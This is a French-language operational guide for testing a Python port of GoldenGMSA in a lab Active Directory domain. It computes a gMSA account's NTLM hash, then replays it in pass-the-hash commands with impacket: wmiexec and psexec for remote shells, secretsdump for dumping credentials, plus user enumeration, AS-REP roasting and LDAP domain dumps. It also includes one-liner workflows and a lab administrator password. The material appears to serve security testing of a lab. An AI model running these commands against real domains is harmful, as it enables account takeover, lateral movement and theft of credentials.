# Commandes de Validation des Hashes NTLM - GoldenGMSA Python

**Date**: 2025-11-02  
**Domaine cible**: lab.local (172.31.124.12)  
**Compte gMSA**: svc_test$

---

## 1. Récupération du Hash NTLM

### Mode en ligne (recommandé - récupère les données à jour)
```bash
cd /home/felix/Desktop/goldenGMSA/golden_gmsa_python
source venv/bin/activate

python3 main.py -u Administrateur -p 'Password1' -d lab.local --dc-ip 172.31.124.12 \
  compute --sid S-1-5-21-4163040651-2381858556-3943169962-1104
```

**Sortie attendue**:
```
NTLM Hash (LM:NT):	{lm_hash}:{nt_hash}
NTLM Hash (NT only):	{nt_hash}
```

### Mode hors ligne
```bash
python3 main.py compute \
  --sid S-1-5-21-4163040651-2381858556-3943169962-1104 \
  --kdskey '{kdskey_base64}' \
  --pwdid '{pwdid_base64}'
```

---

## 2. Format du Hash pour Impacket

Les outils impacket nécessitent le format **LM:NT**. Pour un hash NT seul, utilisez:

**Format**: `aad3b435b51404eeaad3b435b51404ee:{NT_HASH}`

Où:
- `aad3b435b51404eeaad3b435b51404ee` = Hash LM vide (standard)
- `{NT_HASH}` = Le hash NT récupéré (32 caractères hex)

**Exemple**:
```bash
# Si le hash NT est: c0c4058cba95fd028c947d0c65e8b19d
HASH="aad3b435b51404eeaad3b435b51404ee:c0c4058cba95fd028c947d0c65e8b19d"
```

---

## 3. Commandes de Validation avec Impacket

### 3.1. smbclient.py (Accès SMB)
```bash
python3 venv/bin/smbclient.py \
  -hashes "$HASH" \
  lab.local/svc_test\$@172.31.124.12

# Une fois connecté, tester avec:
# > ls
# > exit
```

**Résultat attendu**: Connexion SMB réussie et listing des partages

---

### 3.2. wmiexec.py (Execution de commandes via WMI)
```bash
python3 venv/bin/wmiexec.py \
  -hashes "$HASH" \
  lab.local/svc_test\$@172.31.124.12 \
  'whoami'

# Ou pour un shell interactif:
python3 venv/bin/wmiexec.py \
  -hashes "$HASH" \
  lab.local/svc_test\$@172.31.124.12
```

**Résultat attendu**: Exécution de commandes réussie

---

### 3.3. psexec.py (PsExec - Shell interactif)
```bash
python3 venv/bin/psexec.py \
  -hashes "$HASH" \
  lab.local/svc_test\$@172.31.124.12 \
  'whoami'

# Pour un shell interactif:
python3 venv/bin/psexec.py \
  -hashes "$HASH" \
  lab.local/svc_test\$@172.31.124.12
```

**Résultat attendu**: Shell interactif obtenu

---

### 3.4. secretsdump.py (Dump des secrets)
```bash
python3 venv/bin/secretsdump.py \
  -hashes "$HASH" \
  lab.local/svc_test\$@172.31.124.12 \
  -target-ip 172.31.124.12
```

**Résultat attendu**: Dump des secrets (si permissions suffisantes)

---

### 3.5. GetADUsers.py (Énumération utilisateurs AD)
```bash
python3 venv/bin/GetADUsers.py \
  -hashes "$HASH" \
  lab.local/svc_test\$ \
  -dc-ip 172.31.124.12
```

**Résultat attendu**: Liste des utilisateurs du domaine

---

### 3.6. GetNPUsers.py (AS-REP Roasting)
```bash
python3 venv/bin/GetNPUsers.py \
  -hashes "$HASH" \
  lab.local/svc_test\$ \
  -dc-ip 172.31.124.12
```

**Résultat attendu**: Liste des comptes vulnérables (si applicable)

---

### 3.7. ldapdomaindump.py (Dump du domaine LDAP)
```bash
python3 venv/bin/ldapdomaindump \
  -u 'svc_test$' \
  -p '' \
  --hashes "$HASH" \
  -d lab.local \
  172.31.124.12
```

**Résultat attendu**: Fichiers HTML/JSON avec dump du domaine

---

## 4. Test Pass-the-Hash avec GoldenGMSA

### 4.1. Tester gmsainfo avec PTH
```bash
# Obtenir le hash NTLM d'un compte administrateur
# Puis utiliser pour énumérer les gMSA:

python3 main.py \
  -u 'Administrateur' \
  --nt-hash '{ADMIN_NT_HASH}' \
  -d lab.local \
  --dc-ip 172.31.124.12 \
  gmsainfo
```

---

### 4.2. Tester kdsinfo avec PTH
```bash
python3 main.py \
  -u 'Administrateur' \
  --nt-hash '{ADMIN_NT_HASH}' \
  -d lab.local \
  --dc-ip 172.31.124.12 \
  kdsinfo
```

---

### 4.3. Tester compute avec PTH
```bash
python3 main.py \
  -u 'Administrateur' \
  --nt-hash '{ADMIN_NT_HASH}' \
  -d lab.local \
  --dc-ip 172.31.124.12 \
  compute \
  --sid S-1-5-21-4163040651-2381858556-3943169962-1104
```

---

## 5. Script Automatique de Validation

Utilisez le script `validate_hash.py` pour tester automatiquement le hash avec tous les outils:

```bash
cd /home/felix/Desktop/goldenGMSA/golden_gmsa_python
source venv/bin/activate
python3 validate_hash.py
```

Ce script:
1. Récupère automatiquement le hash NTLM actuel
2. Teste le hash avec tous les outils impacket disponibles
3. Affiche un résumé des résultats

---

## 6. Notes Importantes

### Changement périodique des mots de passe gMSA

⚠️ **ATTENTION**: Les gMSA changent leurs mots de passe automatiquement toutes les **30 jours** (par défaut).

**Implications**:
- Le hash calculé est valide uniquement pendant la période de validité actuelle
- Si vous calculez un hash à T1 et testez à T2 (plusieurs jours plus tard), le hash peut être différent
- **Recommandation**: Toujours calculer le hash juste avant de l'utiliser

### Validation du Hash

Si vous obtenez `STATUS_LOGON_FAILURE`:
1. ✅ Vérifiez que le hash est récent (calculé aujourd'hui)
2. ✅ Vérifiez le format (LM:NT avec hash LM vide)
3. ✅ Vérifiez que le compte gMSA est toujours actif
4. ✅ Vérifiez les permissions du compte gMSA

### Format du Password Blob

Le password blob de 256 bytes contient:
- **Bytes 0-15**: Hash LM (16 bytes)
- **Bytes 16-31**: Hash NT (16 bytes) ← **C'est ce que nous utilisons**
- **Bytes 32-255**: Données supplémentaires (224 bytes)

---

## 7. Exemples Complets

### Exemple 1: Workflow complet
```bash
# 1. Récupérer le hash
HASH_NT=$(python3 main.py -u Administrateur -p 'Password1' -d lab.local --dc-ip 172.31.124.12 \
  compute --sid S-1-5-21-4163040651-2381858556-3943169962-1104 2>&1 | \
  grep "NTLM Hash (NT only):" | awk '{print $4}')

# 2. Formater pour impacket
HASH_FULL="aad3b435b51404eeaad3b435b51404ee:$HASH_NT"

# 3. Valider avec smbclient
python3 venv/bin/smbclient.py -hashes "$HASH_FULL" lab.local/svc_test\$@172.31.124.12
```

### Exemple 2: Utilisation directe
```bash
# Calculer et utiliser directement
python3 main.py -u Administrateur -p 'Password1' -d lab.local --dc-ip 172.31.124.12 \
  compute --sid S-1-5-21-4163040651-2381858556-3943169962-1104 | \
  grep "NTLM Hash (NT only):" | awk '{print $4}' | \
  xargs -I {} python3 venv/bin/smbclient.py \
    -hashes "aad3b435b51404eeaad3b435b51404ee:{}" \
    lab.local/svc_test\$@172.31.124.12
```

---

## 8. Dépannage

### Erreur: STATUS_LOGON_FAILURE
**Causes possibles**:
- Hash expiré (gMSA a changé de mot de passe)
- Format incorrect (vérifier LM:NT)
- Compte gMSA désactivé ou supprimé

**Solution**: Recalculer le hash avec la commande `compute`

### Erreur: Connection refused
**Causes possibles**:
- Service Windows non disponible (SMB, WMI, etc.)
- Firewall bloquant la connexion

**Solution**: Vérifier que les services sont disponibles sur le serveur

### Erreur: Invalid credentials
**Causes possibles**:
- Hash incorrect
- Nom d'utilisateur incorrect (ne pas oublier le `$` pour les comptes machine)

**Solution**: Vérifier le format: `domain/username$@IP`

---

## 9. Checklist de Validation

- [ ] Hash NTLM récupéré avec succès
- [ ] Format correct (32 caractères hex pour NT hash)
- [ ] Hash formaté en LM:NT pour impacket
- [ ] Test smbclient.py
- [ ] Test wmiexec.py (si service disponible)
- [ ] Test psexec.py (si service disponible)
- [ ] Test secretsdump.py (si permissions suffisantes)
- [ ] Hash récent (calculé aujourd'hui)

---

**Dernière mise à jour**: 2025-11-02

